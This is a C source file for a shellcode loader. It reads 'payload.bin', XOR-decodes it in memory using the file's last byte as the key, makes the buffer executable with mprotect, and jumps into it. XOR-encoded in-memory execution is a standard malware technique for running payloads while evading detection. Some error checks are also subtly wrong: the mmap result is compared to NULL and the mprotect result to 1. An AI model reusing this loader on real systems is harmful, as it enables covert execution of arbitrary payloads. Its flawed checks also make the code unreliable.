#define _GNU_SOURCE
#include <stdio.h>
#include <sys/mman.h>
#include <stdlib.h>

int main() {

    FILE *f;
    size_t len;
    void *my_payload_mem;

    // open file
    f = fopen("payload.bin", "rb");

    if (f == NULL) {
        perror("File open error");
        return 1;
    }

    // go to the end, ask position, go back to start
    fseek(f, 0, SEEK_END);
    len = ftell(f);
    rewind(f);
    printf("len: %ld\n",len);

    // allocate memory
    my_payload_mem = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (my_payload_mem == NULL) {
        perror("memory allocation error");
        return 1;
    }

    // read file into allocated memory
    fread(my_payload_mem, 1, len, f);
    fclose(f);

    // get the key 
    unsigned char *byte_array = (unsigned char *)my_payload_mem;
    unsigned char key = byte_array[len-1];
    printf("the key found: 0x%02x\n", key);

    // xor the payload from the bin file
    for (int i = 0; i < len - 1; i++) {
        // GOOD: Uses placeholders %ld (for index) and %02x (for hex byte)
        byte_array[i] = byte_array[i] ^ key;
        printf("File data at index %d: 0x%02x\n", i, byte_array[i]);    
    }

    // change data permissions to executable
    int status = mprotect(my_payload_mem, len, PROT_READ | PROT_EXEC);

    if (status == 1) {
        perror("mprotect failed");
        return 1;
    }

    // cast the null pointer to function pointer:
    // create a funciton pointer
    void (*func_ptr)();

    // cast the void pointer to the function pointer
    *(void**)(&func_ptr) = my_payload_mem;

    // call the function pointer
    func_ptr();

    return 0;
}